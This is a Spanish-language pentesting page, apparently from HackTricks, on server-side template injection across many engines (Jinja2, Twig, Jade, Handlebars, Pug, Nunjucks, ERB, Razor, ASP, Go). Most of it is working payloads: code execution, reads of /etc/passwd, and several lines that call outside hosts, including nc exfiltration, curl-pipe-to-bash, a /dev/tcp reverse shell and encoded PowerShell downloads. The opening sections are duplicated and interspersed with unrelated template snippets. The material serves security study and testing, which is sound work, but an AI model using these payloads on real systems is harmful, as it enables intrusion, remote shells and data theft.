La inyecci√≥n de plantillas en el lado del servidor (SSTI) es una vulnerabilidad que permite a un atacante ejecutar c√≥digo en el servidor a trav√©s de la inyecci√≥n de c√≥digo en una plantilla. Esta vulnerabilidad es com√∫n en aplicaciones web que utilizan plantillas para generar contenido din√°mico.

## Ejemplos de SSTI

### Jinja2

Jinja2 es un motor de plantillas para Python. Es com√∫nmente utilizado en aplicaciones web de Python, como Flask y Django.

#### Ejemplo 1: Accediendo a variables globales

```python
{% for key, value in globals().items() %}
    {{ key }}: {{ value }}
{% endfor %}
```

#### Ejemplo 2: Ejecutando comandos del sistema

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

### Twig

Twig es un motor de plantillas para PHP. Es com√∫nmente utilizado en aplicaciones web de PHP, como Symfony y Laravel.

#### Ejemplo 1: Accediendo a variables globales

```php
{{ dump(_context) }}
```

#### Ejemplo 2: Ejecutando comandos del sistema

```php
{{ system('id') }}
```

## Prevenci√≥n de SSTI

Para prevenir la inyecci√≥n de plantillas en el lado del servidor, se deben seguir las siguientes pr√°cticas recomendadas:

- Validar y sanitizar todas las entradas de usuario.
- Limitar el acceso a las variables globales en las plantillas.
- Utilizar un motor de plantillas que tenga una pol√≠tica de seguridad s√≥lida.
- Mantener el software actualizado con las √∫ltimas correcciones de seguridad.
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
# Inyecci√≥n de plantillas en el lado del servidor (SSTI)

La inyecci√≥n de plantillas en el lado del servidor (SSTI) es una vulnerabilidad que permite a un atacante ejecutar c√≥digo en el servidor a trav√©s de la inyecci√≥n de c√≥digo en una plantilla. Esta vulnerabilidad es com√∫n en aplicaciones web que utilizan plantillas para generar contenido din√°mico.

## Ejemplos de SSTI

### Jinja2

Jinja2 es un motor de plantillas para Python. Es com√∫nmente utilizado en aplicaciones web de Python, como Flask y Django.

#### Ejemplo 1: Accediendo a variables globales

```python
{% for key, value in globals().items() %}
    {{ key }}: {{ value }}
{% endfor %}
```

#### Ejemplo 2: Ejecutando comandos del sistema

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

### Twig

Twig es un motor de plantillas para PHP. Es com√∫nmente utilizado en aplicaciones web de PHP, como Symfony.

#### Ejemplo 1: Accediendo a variables globales

```php
{{ dump(_context) }}
```

#### Ejemplo 2: Ejecutando comandos del sistema

```php
{{ system('id') }}
```

## Prevenci√≥n de SSTI

Para prevenir la inyecci√≥n de plantillas en el lado del servidor, se deben seguir las siguientes pr√°cticas recomendadas:

- Validar y sanitizar todas las entradas de usuario.
- Limitar el acceso a las variables globales y a las funciones peligrosas.
- Utilizar un motor de plantillas que tenga una pol√≠tica de seguridad s√≥lida.
- Mantener el software actualizado con las √∫ltimas correcciones de seguridad.
```html
<html>
  <head>
    <title><?=$this->e($title)?></title>
  </head>
  <body>
    <?=$this->section('content')?>
  </body>
</html>
```
### PHPlib y HTML\_Template\_PHPLIB (PHP)

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB) es lo mismo que PHPlib pero portado a Pear.

`authors.tpl`
```html
<html>
 <head><title>{PAGE_TITLE}</title></head>
 <body>
  <table>
   <caption>Authors</caption>
   <thead>
    <tr><th>Name</th><th>Email</th></tr>
   </thead>
   <tfoot>
    <tr><td colspan="2">{NUM_AUTHORS}</td></tr>
   </tfoot>
   <tbody>
<!-- BEGIN authorline -->
    <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
   </tbody>
  </table>
 </body>
</html>
```
# `authors.php`

## Descripci√≥n
La p√°gina `authors.php` muestra informaci√≥n sobre los autores del sitio web.

## Vulnerabilidad
La p√°gina `authors.php` es vulnerable a la inyecci√≥n de plantillas en el lado del servidor (SSTI) debido a que el par√°metro `author` no est√° siendo sanitizado adecuadamente antes de ser utilizado en una funci√≥n de renderizado de plantillas.

## Impacto
Un atacante podr√≠a explotar esta vulnerabilidad para ejecutar c√≥digo arbitrario en el servidor y obtener acceso no autorizado a informaci√≥n confidencial.

## Ejemplo de explotaci√≥n
```
https://example.com/authors.php?author={{7*7}}
```

## Soluci√≥n
Se debe implementar una sanitizaci√≥n adecuada de los par√°metros de entrada antes de ser utilizados en funciones de renderizado de plantillas.
```php
<?php
//we want to display this author list
$authors = array(
    'Christian Weiske'  => 'cweiske@php.net',
    'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
    $t->setVar('AUTHOR_NAME', $name);
    $t->setVar('AUTHOR_EMAIL', $email);
    $t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
### Jade (NodeJS)

Jade es un motor de plantillas para NodeJS que permite la creaci√≥n de HTML de manera m√°s f√°cil y r√°pida. Jade utiliza una sintaxis simplificada que permite la creaci√≥n de plantillas de manera m√°s eficiente. Sin embargo, esta sintaxis simplificada tambi√©n puede ser vulnerable a la inyecci√≥n de c√≥digo en el lado del servidor.

Para explotar una vulnerabilidad de inyecci√≥n de plantillas en Jade, un atacante puede enviar una entrada maliciosa que contenga c√≥digo malicioso. Este c√≥digo malicioso se ejecutar√° en el servidor y puede permitir al atacante acceder a informaci√≥n confidencial o tomar el control del servidor.

Para prevenir la inyecci√≥n de plantillas en Jade, se recomienda validar y sanitizar todas las entradas de usuario antes de procesarlas. Tambi√©n se recomienda utilizar la √∫ltima versi√≥n de Jade y mantenerla actualizada para evitar vulnerabilidades conocidas.
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**M√°s informaci√≥n**

* En la secci√≥n Jade de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template) es un motor de plantillas PHP que no compila y que utiliza etiquetas XML para dividir un documento en diferentes partes.
```xml
<patTemplate:tmpl name="page">
  This is the main page.
  <patTemplate:tmpl name="foo">
    It contains another template.
  </patTemplate:tmpl>
  <patTemplate:tmpl name="hello">
    Hello {NAME}.<br/>
  </patTemplate:tmpl>
</patTemplate:tmpl>
```
### Handlebars (NodeJS)

Traversing de ruta (m√°s informaci√≥n [aqu√≠](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)).
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= Error
* ${7\*7} = ${7\*7}
* Nothing

---

* \= Error
* ${7\*7} = ${7\*7}
* Nada
```java
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

URLencoded:
%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
```
**M√°s informaci√≥n**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **Plantilla** | **Descripci√≥n**                         |
| ------------ | --------------------------------------- |
|              | Eval√∫a y renderiza la salida             |
|              | Eval√∫a y renderiza la salida codificada en HTML |
|              | Comentario                               |
| y            | Permite c√≥digo (deshabilitado por defecto) |

* \= 49

**Lado del cliente**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**Lado del Servidor**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**M√°s informaci√≥n**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**Ejemplo de renderizado del lado del servidor**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**M√°s informaci√≥n**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = Sin salida
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = Error
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**M√°s informaci√≥n**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (Ruby)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = Error`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**M√°s informaci√≥n**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (Ruby)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**M√°s informaci√≥n**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

Visita la siguiente p√°gina para aprender trucos sobre **bypassing de ejecuci√≥n de comandos arbitrarios en python**:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = Error`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}




{{os.system('whoami')}}
{{os.system('whoami')}}
```
**M√°s informaci√≥n**

### Jinja2 (Python)

[Sitio web oficial](http://jinja.pocoo.org)

> Jinja2 es un motor de plantillas completo para Python. Tiene soporte completo de Unicode, un entorno de ejecuci√≥n en sandbox opcional, ampliamente utilizado y con licencia BSD.

* `{{7*7}} = Error`
* `${7*7} = ${7*7}`
* `{{foobar}} Nada`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}



{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - Formato de plantilla**
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}
{% endraw %}


```
[**RCE no dependiente de**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) `__builtins__`:
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**M√°s detalles sobre c√≥mo abusar de Jinja**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

### Mako (Python)

Mako es un motor de plantillas de Python que tambi√©n puede ser vulnerable a la inyecci√≥n de plantillas del lado del servidor (SSTI). Al igual que con Jinja, la inyecci√≥n de plantillas Mako se produce cuando se permite que el usuario proporcione una entrada que se procesa como una plantilla. La entrada del usuario se eval√∫a como c√≥digo Python en el servidor, lo que permite al atacante ejecutar c√≥digo arbitrario en el contexto del servidor. Para obtener m√°s informaci√≥n sobre c√≥mo explotar la inyecci√≥n de plantillas Mako, consulte la siguiente referencia:

{% content-ref url="mako-ssti.md" %}
[mako-ssti.md](mako-ssti.md)
{% endcontent-ref %}
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
### Razor (.Net)

* `@(2+2) <= √âxito`
* `@() <= √âxito`
* `@("{{code}}") <= √âxito`
* `@ <= √âxito`
* `@{} <= ¬°ERROR!`
* `@{ <= ¬°ERROR!`
* `@(1+2)`
* `@( //C#Code )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwMAXABUAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");`

    El m√©todo `System.Diagnostics.Process.Start` de .NET se puede utilizar para iniciar cualquier proceso en el servidor y, por lo tanto, crear un webshell. Puede encontrar un ejemplo de aplicaci√≥n web vulnerable en [https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)

**M√°s informaci√≥n**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = Nada
* `<%= response.write(date()) %>` = \<Date>
```bash
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**M√°s informaci√≥n**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojolicious (Perl)

Aunque sea perl, utiliza etiquetas como ERB en Ruby.

* `<%= 7*7 %> = 49`
* `<%= foobar %> = Error`
```
<%= perl code %>
<% perl code %>
```
### SSTI en GO

Para confirmar que el motor de plantillas utilizado en el backend es Go, puedes utilizar estas cargas √∫tiles:

* `{{ . }}` = estructura de datos que se pasa como entrada a la plantilla
  * Si los datos pasados son un objeto que contiene el atributo Password, por ejemplo, la carga anterior lo filtrar√≠a, pero tambi√©n podr√≠as hacer: `{{ .Password }}`
* `{{printf "%s" "ssti" }}` = deber√≠a mostrar la cadena ssti en la respuesta
* `{{html "ssti"}}`, `{{js "ssti"}}` = Estas son algunas otras cargas √∫tiles que deber√≠an mostrar la cadena "ssti" sin las palabras finales "js" o "html". Puedes consultar m√°s palabras clave en el motor [aqu√≠](https://golang.org/pkg/text/template).

**Explotaci√≥n de XSS**

Si el servidor est√° **utilizando el paquete text/template**, es muy f√°cil lograr XSS simplemente proporcionando tu **carga √∫til** como entrada. Sin embargo, ese no es el caso con html/template ya que codifica en HTML la respuesta: `{{"<script>alert(1)</script>"}}` --> `&lt;script&gt;alert(1)&lt;/script&gt;`

Sin embargo, Go permite **DEFINIR** una **plantilla completa** y luego **llamarla m√°s tarde**. La carga √∫til ser√≠a algo como:\
`{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}`

**Explotaci√≥n de RCE**

La documentaci√≥n para ambos m√≥dulos html/template se puede encontrar [aqu√≠](https://golang.org/pkg/html/template/), y la documentaci√≥n para el m√≥dulo text/template se puede encontrar [aqu√≠](https://golang.org/pkg/text/template/), y s√≠, var√≠an mucho. Por ejemplo, en **text/template**, puedes **llamar directamente cualquier funci√≥n p√∫blica con el valor "call"**, sin embargo, este no es el caso con html/template.

Si quieres encontrar una RCE en Go a trav√©s de SSTI, debes saber que como puedes acceder al objeto dado a la plantilla con `{{ . }}`, tambi√©n puedes **llamar a los m√©todos de los objetos**. Entonces, imagina que el **objeto pasado tiene un m√©todo llamado System** que ejecuta el comando dado, podr√≠as abusar de √©l con: `{{ .System "ls" }}`\
Por lo tanto, probablemente **necesitar√°s el c√≥digo fuente**. Un c√≥digo fuente potencial para algo as√≠ se ver√≠a as√≠:
```go
func (p Person) Secret (test string) string {
	out, _ := exec.Command(test).CombinedOutput()
	return string(out)
}
```
**M√°s informaci√≥n**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### M√°s exploits

Revisa el resto de [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) para m√°s exploits. Tambi√©n puedes encontrar informaci√≥n interesante en las etiquetas de [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## Ayuda relacionada

Si crees que puede ser √∫til, lee:

* [Trucos de Flask](../../network-services-pentesting/pentesting-web/flask.md)
* [Funciones m√°gicas de Python](broken-reference/)

## Herramientas

{% embed url="https://github.com/epinna/tplmap" %}

## Lista de detecci√≥n de fuerza bruta

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## Pr√°ctica y referencias

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [**https://portswigger.net/web-security/server-side-template-injection**](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad m√°s relevante en **Espa√±a** y uno de los m√°s importantes en **Europa**. Con **la misi√≥n de promover el conocimiento t√©cnico**, este congreso es un punto de encuentro para los profesionales de la tecnolog√≠a y la ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
